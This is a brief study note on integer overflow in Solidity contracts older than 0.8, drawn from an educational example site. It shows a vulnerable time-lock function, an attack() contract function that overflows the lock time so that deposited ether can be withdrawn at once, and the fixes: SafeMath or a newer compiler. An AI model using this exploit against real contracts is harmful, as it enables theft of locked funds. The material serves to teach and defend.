#overflow #underflow

https://solidity-by-example.org/hacks/overflow/

Before solidity 0.8, there's no auto check under/overflow
```solidity
function increaseLockTime(uint256 _secondsToIncrease) public { 
	lockTime[msg.sender] += _secondsToIncrease; 
}
```

The attack can attack the function like this:
```solidity
function attack() public payable { 
	timeLock.deposit{value: msg.value}(); 
	/* 
	if t = current lock time then we need to find x such that 
	x + t = 2**256 = 0 
	so x = -t 2**256 = type(uint).max + 1 
	so x = type(uint).max + 1 - t 
	*/
	timeLock.increaseLockTime( 
		type(uint256).max + 1 - timeLock.lockTime(address(this)) 
	); 
	timeLock.withdraw(); 
}
```

Solution:
1. use `SafeMath`
2. use solidity version > 0.8.0